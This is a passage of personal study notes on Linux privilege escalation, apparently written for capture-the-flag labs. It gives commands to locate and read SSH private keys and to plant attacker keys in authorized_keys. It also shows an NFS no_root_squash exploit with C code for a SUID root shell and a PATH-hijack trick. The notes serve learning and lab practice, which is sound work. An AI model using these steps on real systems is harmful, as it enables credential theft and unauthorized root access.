    - `ls -la /home /root /etc/ssh /home/*/.ssh/`
    - `find / -name authorized_keys 2> /dev/null`
    - `locate id_rsa` / `locate id_dsa` / `find / -name id_rsa 2> /dev/null` / `find / -name id_dsa 2> /dev/null`
    - `cat /home/*/.ssh/id_rsa` / `cat /home/*/.ssh/id_dsa`
    - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
    - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`



- Two ways to exploit

    - `Accessing readable private SSH keys and using them to authenticate`
        - find private key
        - copy the conetent of it or else get it transfered ot our attacker machine
        - create a file and copy the contetnt in it
        - it needs to be only readable and writable only by its owner
            - `chmod 600 key_name`
        - finally login as the that user
            - `ssh -i key_name user_name@X.X.X.X`

    - `Accessing writable public SSH keys and adding your own one to them to authenticate`
        - The `authorized_keys` file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. 
        - So If the authorized_keys file is writable `rwxrwxrwx` to the current user, `this can be exploited by adding additional authorized keys.`
        - So We simply need to generate new public and private key pair, then copy the public key into server's `authorised keys` file
            - In case we already have ssh access we can simply do by using `ssh-copy-id`
                - `ssh-copy-id user_name@X.X.X.X`
            - or we can also simply by using cat to output the contents of the id_rsa.pub file and redirect it to the authorized_keys file
                - `cat ~/.ssh/id_rsa.pub | ssh user_name@X.X.X.X "cat >> /home/user_name/.ssh/authorized_keys"`


[EXAMPLE](https://0xdf.gitlab.io/2023/01/21/htb-updown.html#ssh)
```
# Fortunately, in developer’s .ssh directory, there’s an RSA key-pair:

developer@updown:/home/developer/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

# The public key matches the authorized_keys file, can be checked using md5sum

developer@updown:/home/developer/.ssh$ md5sum authorized_keys  id_rsa.pub 
4ecdaf650dc5b78cb29737291233fe99  authorized_keys
4ecdaf650dc5b78cb29737291233fe99  id_rsa.pub

# So the private key should be good enough to get a shell as developer, and it does:

oxdf@hacky$ vim ~/keys/updown-developer
oxdf@hacky$ chmod 600 ~/keys/updown-developer
oxdf@hacky$ ssh -i ~/keys/updown-developer developer@siteisup.htb
...[snip]...
developer@updown:~$

```

###### Misconfigured NFS (Network File Sharing)

- check for `“no_root_squash” ` in `/etc/exports` file

    ```
    karen@ip-10-10-17-59:/$ `cat /etc/exports`

    # /etc/exports: the access control list for filesystems which may be exported
    #               to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
    ```
- If the `“no_root_squash”` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system

    - Enumerate mountable shares from our attacking machine.
        - `showmount -e 10.10.17.59`

    - we can mount above shares, we are interested in `no_root_sqash` so will mount /home/backup
     - `mkdir /tmp/targetsharebackup` > `mount -o rw 10.10.17.59:/home/backup /tmp/targetsharebackup `

    - Now since As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
     - `cd /tmp/targetsharebackup` 

        ```
        ┌──(root㉿kali)-[/tmp/targetsharebackup]
        └─# `nano nfc.c`  

        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("/bin/bash");
        }
        ```
    - Complie the code to create executable and give SUID permission
     - `gcc nfc.c -o nfs` > `chmod u+s nfs`
            
    - get back to Target machine You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

    - run the binary and get Root access
        - ``./home/backup/nfs`` > `id`

###### PATH writable folder

Conditions Required
    - There should be a file wih SUID permission created by root user.
    - This file should be executing some other file of which absolute path is not mentioned , therfore it will look for PATH vairable for this file
        ```
        ┌──(root㉿kali)-[/home/kali/Desktop]
        └─# `cat testelf_code.c` 
        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("thm");
        }
        ```
    - you should have write privileges to folder in PATH
    - you can then create `thm` file in that folder  put malicious code in it
    ```
    ┌──(user㉿kali)-[/tmp]
    └─$ `echo "/bin/bash" > thm`
    ```
    - you can then give it rwx permission
        - ``chmod 777 thm``
    - further you can execute the SUID binary and get root access
        - ``./testelf` > `id`

